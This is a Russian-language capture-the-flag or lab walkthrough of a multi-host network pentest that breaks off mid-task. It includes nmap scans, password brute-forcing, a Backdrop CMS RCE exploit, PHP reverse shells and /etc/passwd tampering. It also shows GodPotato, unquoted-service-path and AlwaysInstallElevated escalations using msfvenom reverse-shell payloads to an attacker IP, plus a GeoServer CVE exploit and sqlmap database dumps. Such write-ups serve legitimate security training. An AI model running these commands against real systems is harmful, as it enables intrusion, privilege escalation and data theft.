>[!tip]- nmap
 -iL scoupout -p10050,10051,10250,10255,1099,111,135,139,143,1433,1434,1500,1521-1527,1540,1541,161,179,2001,2010,2049,21,2181,22,2222,23,2375,2376,2379,25,27017,27018,2809,3050,3200-3299,3306,3389,389,443,445,4678,4786,4848,4899,49152,50013,50070,53,5432,5433,5555,5557,5558,5559,5601,5666,5800-5810,5900,5901,5985,5986,623,636,6379,6443,7001,7873,80,8000,8001,8002,8004,8006,8007,8008,8080,8081,8111,8180,8200,8201,8291,8400,8443,8500,8501,873,88,8879,8888,9000,9043,9060,9080,9200,9300,9443,9501,9502,9503 -sVC --open -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-10 17:27 MSK
Nmap scan report for 10.114.0.98
Host is up (0.036s latency).
Not shown: 212 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 c1:44:09:2c:87:f3:5d:46:68:26:aa:43:bb:ac:6f:9d (RSA)
|   256 81:4e:1d:b7:55:53:7c:93:29:3e:58:9a:37:a3:ad:32 (ECDSA)
|_  256 71:62:b5:ff:e2:0f:8d:25:3e:30:04:1e:48:e2:65:8b (ED25519)
80/tcp open  http    Apache httpd 2.4.61 ((Debian))
|_http-server-header: Apache/2.4.61 (Debian)
| http-robots.txt: 22 disallowed entries (15 shown)
| /core/ /profiles/ /README.md /web.config /admin 
| /comment/reply /filter/tips /node/add /search /user/register 
|_/user/password /user/login /user/logout /?q=admin /?q=comment/reply
|_http-title: Home | We help you create a comfortable future
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Nmap scan report for 10.114.0.125
Host is up (0.035s latency).
Not shown: 213 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE VERSION
443/tcp open  https?
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 5 IP addresses (5 hosts up) scanned in 46.31 seconds

находим сайт it_solutions.com и добавляем в hosts
Находим логины adminer1-7, используя данные пароли попробуем брутфорс
подбираем пароль adminer6:password
Затем определяем версию Backdrop CMS 1.27.1 и находим эксплоит ([Backdrop CMS 1.27.1 - Authenticated Remote Command Execution (RCE) - PHP webapps Exploit](https://www.exploit-db.com/exploits/52021))
создаем эксплоит
```
python3 52021.py http://it_solutions.com           
Backdrop CMS 1.27.1 - Remote Command Execution Exploit
Evil module generating...
Evil module generated! shell.zip
Go to http://it_solutions.com/admin/modules/install and upload the shell.zip for Manual Installation.
Your shell address: http://it_solutions.com/modules/shell/shell.php

```
Также создаем php revshell доступ ( созданый ранее shell.php дает нам RCE) с помощью revshells.com
Добавляем все в архив tar
```
tar cf shell.tar shell
```

Затем загружаем архив по адресу http://10.114.0.98/admin/installer/manual 
после загрузке переходим по адресу 10.114.0.98/modules/shell/revshells.php и получаем обратный шелл под пользователем www-data
Создаем стабильный шелл
```
python -c "import pty; pty.spawn('/bin/bash')"
```

При ручной энумерации с помощью `find / -writable -type d 2>/dev/null` находим что мы можем записывать информацию в /etc/passwd
Копируем информацию из /etc/passwd и на своей машине создаем аналогичный файл и добавляем в конце```gg:$5$a$gemgwVPxLx/tdtByhncd4joKlMRYQ3IVwdoBXPACCL2:0:0:gg:/root/bin/bash``` 
Теперь загружаем его на машину, создаем копию оригинального файла и заменяем на наш файл
![](../../attachment/Pasted%20image%2020250915213047.png)
Получаем первый флаг

Проверяем /home/config и находим ovpn файл для подключения во внутреннюю есть и ldap.py. Посмотрим содержимое ldap.py и найдем пароль и логин 



>[!tip]-  fping -asgq 10.144.4.0/22                      
10.144.4.1
10.144.4.3
10.144.4.2
10.144.4.5
10.144.4.33
10.144.4.65
10.144.4.70
10.144.4.97
10.144.4.100
10.144.4.101
10.144.4.102
10.144.4.129
10.144.4.130
10.144.4.131
10.144.4.193
10.144.5.2
10.144.5.1

>[!tip]- nmap -iL mainscoup -p10050,10051,10250,10255,1099,111,135,139,143,1433,1434,1500,1521-1527,1540,1541,161,179,2001,2010,2049,21,2181,22,2222,23,2375,2376,2379,25,27017,27018,2809,3050,3200-3299,3306,3389,389,443,445,4678,4786,4848,4899,49152,50013,50070,53,5432,5433,5555,5557,5558,5559,5601,5666,5800-5810,5900,5901,5985,5986,623,636,6379,6443,7001,7873,80,8000,8001,8002,8004,8006,8007,8008,8080,8081,8111,8180,8200,8201,8291,8400,8443,8500,8501,873,88,8879,8888,9000,9043,9060,9080,9200,9300,9443,9501,9502,9503 --open -sVC -Pn
>10.144.4.70
>ORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-16 10:57:11Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: devs.stf0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: devs.stf0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
|_clock-skew: 1s
| smb2-time: 
|   date: 2025-09-16T10:57:42
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
Nmap scan report for 10.144.4.100
Host is up (0.055s latency).
Not shown: 208 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp  open  https?
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU
| Not valid before: 2023-03-22T13:42:05
|_Not valid after:  2033-03-19T13:42:05
445/tcp  open  microsoft-ds  Windows 10 Enterprise 19045 microsoft-ds (workgroup: devs)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: devs
|   NetBIOS_Domain_Name: devs
|   NetBIOS_Computer_Name: KDAVIS
|   DNS_Domain_Name: devs.stf
|   DNS_Computer_Name: kdavis.devs.stf
|   DNS_Tree_Name: devs.stf
|   Product_Version: 10.0.19041
|_  System_Time: 2025-09-16T10:57:40+00:00
| ssl-cert: Subject: commonName=kdavis.devs.stf
| Not valid before: 2025-09-15T00:11:03
|_Not valid after:  2026-03-17T00:11:03
|_ssl-date: 2025-09-16T10:58:14+00:00; +1s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: KDAVIS; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 10 Enterprise 19045 (Windows 10 Enterprise 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: kdavis
|   NetBIOS computer name: KDAVIS\x00
|   Domain name: devs.stf
|   Forest name: devs.stf
|   FQDN: kdavis.devs.stf
|_  System time: 2025-09-16T10:57:45+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 3s, deviation: 5s, median: 0s
| smb2-time: 
|   date: 2025-09-16T10:57:43
|_  start_date: N/A
Nmap scan report for 10.144.4.101
Host is up (0.053s latency).
Not shown: 208 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp  open  https?
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU
| Not valid before: 2023-03-22T13:42:05
|_Not valid after:  2033-03-19T13:42:05
445/tcp  open  microsoft-ds  Windows 10 Enterprise 19045 microsoft-ds (workgroup: devs)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=cmarsh.devs.stf
| Not valid before: 2025-09-15T00:06:07
|_Not valid after:  2026-03-17T00:06:07
|_ssl-date: 2025-09-16T10:58:14+00:00; +1s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: CMARSH; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 6s, deviation: 10s, median: 1s
| smb-os-discovery: 
|   OS: Windows 10 Enterprise 19045 (Windows 10 Enterprise 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: cmarsh
|   NetBIOS computer name: CMARSH\x00
|   Domain name: devs.stf
|   Forest name: devs.stf
|   FQDN: cmarsh.devs.stf
|_  System time: 2025-09-16T10:57:54+00:00
| smb2-time: 
|   date: 2025-09-16T10:57:53
|_  start_date: N/A
Nmap scan report for 10.144.4.102
Host is up (0.091s latency).
Not shown: 208 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp  open  https?
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU
| Not valid before: 2023-03-22T13:42:05
|_Not valid after:  2033-03-19T13:42:05
445/tcp  open  microsoft-ds  Windows 10 Enterprise 19045 microsoft-ds (workgroup: devs)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-09-16T10:58:14+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=jdunn.devs.stf
| Not valid before: 2025-09-15T00:09:14
|_Not valid after:  2026-03-17T00:09:14
| rdp-ntlm-info: 
|   Target_Name: devs
|   NetBIOS_Domain_Name: devs
|   NetBIOS_Computer_Name: JDUNN
|   DNS_Domain_Name: devs.stf
|   DNS_Computer_Name: jdunn.devs.stf
|   DNS_Tree_Name: devs.stf
|   Product_Version: 10.0.19041
|_  System_Time: 2025-09-16T10:57:34+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: JDUNN; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
| smb2-time: 
|   date: 2025-09-16T10:57:48
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 10 Enterprise 19045 (Windows 10 Enterprise 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: jdunn
|   NetBIOS computer name: JDUNN\x00
|   Domain name: devs.stf
|   Forest name: devs.stf
|   FQDN: jdunn.devs.stf
|_  System time: 2025-09-16T10:57:51+00:00
|_clock-skew: mean: 4s, deviation: 7s, median: 0s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
Post-scan script results:
| clock-skew: 
|   1s: 
|     10.144.4.70
|     10.144.4.101
|   4s: 
|     10.144.4.102
|_    10.144.4.100

добавим в /etc/hosts домен

enum4linux -a -u "<log_ovpn" -p "<pass_ovpn>" 10.144.4.70
находим пользователей:
c_marsh
j_dunn
k_davis
k_gonzales
Administrator

SMB         10.144.4.70     445    DC             
SMB         10.144.4.101    445    CMARSH        
SMB         10.144.4.102    445    JDUNN          (impersonate)
SMB         10.144.4.100    445    KDAVIS        

Подключаемся по rdp к пользователю jdunn используя креды найденные в ldap.py
При анализе системы видим включенные SeImpersonatePrivilige => используем картошку
Скачиваем GodPotato с помощью iwr, запускаем и получаем флаг
```
./god.exe -cmd "cmd /c type C:\Windows\cybered.flag"
```



Подключаемся по rdp к пользователя kdavis и с помощью SharpUp.exe находим сервис vulns, у которого в пути к исполняемому файлу есть пробелы "C:\Program Files\Ignite Data\ Vuln Service\file.exe"
Создаем полезную нагрузку ```msfvenom -p windows/shell_reverse_tcp LHOST=10.114.252.17 LPORT=4444 -f exe > Vuln.exe``` и помещаем ее по пути C:\Program Files\Ignite Data. Запускаем слушателя и запускаем сервис
![](../../attachment/Pasted%20image%2020250916154239.png)

Подключаемся по rdp к пользователю cmarsh и проверяем политику AlwaysInstallElevated
```
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
Политика имеет значение (0x1) - включена
Создаем полезную нагрузку msi и запускаем слушателя ```
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.114.252.17 LPORT=4444 -f msi -o unl.msi```
 Передаем на машину и запускаем установку msiexec.exe /quiet /qn /i unl.msi
 Получаем обратный шелл от системы и забираем флаг
 ![](../../attachment/Pasted%20image%2020250916154840.png)


Закончив с первыми машинами закинем агента ligolo на одну из машин (4.101) и с помощью пивотинга получим доступ к оставшимся задачам:
4.2 screens
4.3 spms 
4.5 tube
4.130 docker1 
 4.131 docker2
 >[!tip]- nmap
 >map scan report for 10.144.4.3
Host is up (0.059s latency).
Not shown: 209 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp?
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (ProFTPD) [::ffff:10.144.4.3]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp   open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 e7:a7:68:5a:e0:55:db:96:7f:b9:aa:5e:30:72:bf:f8 (RSA)
|   256 1d:75:9d:23:c6:58:40:c1:7d:ec:0f:7b:ff:6f:66:34 (ECDSA)
|_  256 df:54:3c:65:6f:e8:f8:ce:e0:fd:17:87:89:c1:fd:85 (ED25519)
80/tcp   open  http     Apache httpd 2.4.58 ((Unix) OpenSSL/1.1.1w PHP/8.2.12 mod_perl/2.0.12 Perl/v5.34.1)
|_http-server-header: Apache/2.4.58 (Unix) OpenSSL/1.1.1w PHP/8.2.12 mod_perl/2.0.12 Perl/v5.34.1
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Service Provider Management System
443/tcp  open  ssl/http Apache httpd 2.4.58 ((Unix) OpenSSL/1.1.1w PHP/8.2.12 mod_perl/2.0.12 Perl/v5.34.1)
|_http-title: Access forbidden!
|_http-server-header: Apache/2.4.58 (Unix) OpenSSL/1.1.1w PHP/8.2.12 mod_perl/2.0.12 Perl/v5.34.1
| ssl-cert: Subject: commonName=localhost/organizationName=Apache Friends/stateOrProvinceName=Berlin/countryName=DE
| Not valid before: 2004-10-01T09:10:30
|_Not valid after:  2010-09-30T09:10:30
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
3306/tcp open  mysql    MariaDB 5.5.5-10.4.32
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.4.32-MariaDB
|   Thread ID: 184
|   Capabilities flags: 63486
|   Some Capabilities: Speaks41ProtocolNew, SupportsLoadDataLocal, Support41Auth, IgnoreSigpipes, Speaks41ProtocolOld, InteractiveClient, ConnectWithDatabase, SupportsTransactions, IgnoreSpaceBeforeParenthesis, SupportsCompression, ODBCClient, FoundRows, LongColumnFlag, DontAllowDatabaseTableColumn, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: .T>uW25PturYH>;P]c\"
|_  Auth Plugin Name: mysql_native_password
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.95%I=7%D=9/16%Time=68C96DFA%P=x86_64-pc-linux-gnu%r(Gene
SF:ricLines,8E,"220\x20ProFTPD\x20Server\x20\(ProFTPD\)\x20\[::ffff:10\.14
SF:4\.4\.3\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20crea
SF:tive\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20creative\
SF:r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Nmap scan report for 10.144.4.2
Host is up (0.069s latency).
Not shown: 212 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 6c:ae:40:fe:62:06:3e:08:f4:96:f1:7d:22:63:ac:dd (RSA)
|   256 8a:be:5e:69:a5:62:26:4b:60:cb:45:c4:bd:7a:47:c5 (ECDSA)
|_  256 93:50:2d:84:88:cc:50:99:6d:be:c0:05:50:08:c2:eb (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: \xD0\x92\xD0\xB8\xD0\xB4\xD0\xB5\xD0\xBE\xD0\xBF\xD0\xBB\xD0\xB0\xD1\x82\xD1\x84\xD0\xBE\xD1\x80\xD0\xBC\xD0\xB0 \xD0\xA4
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Nmap scan report for 10.144.4.5
Host is up (0.064s latency).
Not shown: 212 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)
| ssh-hostkey: 
|   256 a6:c9:3a:3f:71:4b:ea:7b:0b:55:e9:d5:85:ff:4c:ec (ECDSA)
|_  256 d4:e8:55:8d:31:5c:54:6c:c2:42:c5:49:24:ef:1c:5f (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: Tube
|_http-server-header: Apache/2.4.62 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Nmap scan report for 10.144.4.130
Host is up (0.066s latency).
Not shown: 212 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)
| ssh-hostkey: 
|   3072 e7:a7:68:5a:e0:55:db:96:7f:b9:aa:5e:30:72:bf:f8 (RSA)
|   256 1d:75:9d:23:c6:58:40:c1:7d:ec:0f:7b:ff:6f:66:34 (ECDSA)
|_  256 df:54:3c:65:6f:e8:f8:ce:e0:fd:17:87:89:c1:fd:85 (ED25519)
8080/tcp open  http    Golang net/http server
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
| http-robots.txt: 1 disallowed entry 
|_/ 
|_http-open-proxy: Proxy might be redirecting requests
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 Not Found
|     Content-Type: text/plain; charset=utf-8
|     Vary: Origin
|     X-Content-Type-Options: nosniff
|     Date: Tue, 16 Sep 2025 14:02:38 GMT
|     Content-Length: 19
|     page not found
|   GenericLines, Help, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, Socks5: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: application/json; charset=utf-8
|     Vary: Origin
|     Date: Tue, 16 Sep 2025 14:02:37 GMT
|     Content-Length: 194
|     {"appType":"EMBEDDED","server":"UP","db":"UP","acceptingEvents":"TRUE","routingEvents":"TRUE","mode":"NORMAL","backendConfigMode":"API","lastSync":"2025-09-16T00:07:12Z","lastRegulationSync":""}
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Vary: Origin
|     Date: Tue, 16 Sep 2025 14:02:38 GMT
|     Content-Length: 0
|   OfficeScan: 
|     HTTP/1.1 400 Bad Request: missing required Host header
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|_    Request: missing required Host header
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.95%I=7%D=9/16%Time=68C96DFB%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,14C,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:\x20application/js
SF:on;\x20charset=utf-8\r\nVary:\x20Origin\r\nDate:\x20Tue,\x2016\x20Sep\x
SF:202025\x2014:02:37\x20GMT\r\nContent-Length:\x20194\r\n\r\n{\"appType\"
SF::\"EMBEDDED\",\"server\":\"UP\",\"db\":\"UP\",\"acceptingEvents\":\"TRU
SF:E\",\"routingEvents\":\"TRUE\",\"mode\":\"NORMAL\",\"backendConfigMode\
SF:":\"API\",\"lastSync\":\"2025-09-16T00:07:12Z\",\"lastRegulationSync\":
SF:\"\"}")%r(HTTPOptions,69,"HTTP/1\.0\x20405\x20Method\x20Not\x20Allowed\
SF:r\nVary:\x20Origin\r\nDate:\x20Tue,\x2016\x20Sep\x202025\x2014:02:38\x2
SF:0GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,67,"HTTP/1\.1\x204
SF:00\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r
SF:\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(FourOhFourReque
SF:st,BE,"HTTP/1\.0\x20404\x20Not\x20Found\r\nContent-Type:\x20text/plain;
SF:\x20charset=utf-8\r\nVary:\x20Origin\r\nX-Content-Type-Options:\x20nosn
SF:iff\r\nDate:\x20Tue,\x2016\x20Sep\x202025\x2014:02:38\x20GMT\r\nContent
SF:-Length:\x2019\r\n\r\n404\x20page\x20not\x20found\n")%r(Socks5,67,"HTTP
SF:/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20chars
SF:et=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Gener
SF:icLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text
SF:/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20R
SF:equest")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:
SF:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20
SF:Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request
SF:\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20clo
SF:se\r\n\r\n400\x20Bad\x20Request")%r(LPDString,67,"HTTP/1\.1\x20400\x20B
SF:ad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConne
SF:ction:\x20close\r\n\r\n400\x20Bad\x20Request")%r(SIPOptions,67,"HTTP/1\
SF:.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=
SF:utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(OfficeSc
SF:an,A3,"HTTP/1\.1\x20400\x20Bad\x20Request:\x20missing\x20required\x20Ho
SF:st\x20header\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnec
SF:tion:\x20close\r\n\r\n400\x20Bad\x20Request:\x20missing\x20required\x20
SF:Host\x20header");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Nmap scan report for 10.144.4.131
Host is up (0.043s latency).
Not shown: 212 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)
| ssh-hostkey: 
|   3072 e7:a7:68:5a:e0:55:db:96:7f:b9:aa:5e:30:72:bf:f8 (RSA)
|   256 1d:75:9d:23:c6:58:40:c1:7d:ec:0f:7b:ff:6f:66:34 (ECDSA)
|_  256 df:54:3c:65:6f:e8:f8:ce:e0:fd:17:87:89:c1:fd:85 (ED25519)
80/tcp open  http    Jetty 9.4.51.v20230217
|_http-title: Error 404 - Not Found
|_http-server-header: Jetty(9.4.51.v20230217)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

4.130
http://10.144.4.130:8080/version
v1/track                [Status: 405, Size: 0, Words: 1, Lines: 1, Duration: 37ms]
v1/identify             [Status: 405, Size: 0, Words: 1, Lines: 1, Duration: 37ms]
?:                      [Status: 200, Size: 194, Words: 1, Lines: 1, Duration: 37ms]
health                  [Status: 200, Size: 194, Words: 1, Lines: 1, Duration: 37ms]
version                 [Status: 200, Size: 302, Words: 6, Lines: 1, Duration: 47ms]

Изучиd сайт geoserver  (4.131 docker2) находим версию 2.23.2. Находим [CVE-2024-36401](https://github.com/Chocapikk/CVE-2024-36401)
Установим в venv и запустим скрипт. Затем выполним поиск файлов `*.flag` и получим флаг 
```
python exploit.py -u http://10.144.4.131/ -ip 10.114.252.17 -rp 5555
back
find / -name "*.flag" 2>/dev/null
```
![](../../attachment/Pasted%20image%2020250918103454.png)

Запускаем sqlmap на хост 4.3 spms для энумерации ДБ (information_schema, mysql, performance_schema, phpmyadmin, spms_db, test)
```
sqlmap -u "http://spms.devs.stf/?page=services/view&id=2" --dbs --dump
```
Находим БД spms_db так как мы знаем что флаг в таблице secret => узнаем название колонки
```
sqlmap -u "http://spms.devs.stf/?page=services/view&id=2" -D "spms_db" -T "secret" --columns 
```
Находим колонку flag и запускаем дамп для получения флага
```
sqlmap -u "http://spms.devs.stf/?page=services/view&id=2" -D spms_db -T secret -C flag --dump --delay=3 --timeout=20 --threads=5
```


Анализируя сайт 10.144.4.2 находим /assets/backup.zip в котором содержится test.js
В test.js расписана логика работы авторизации на сайте 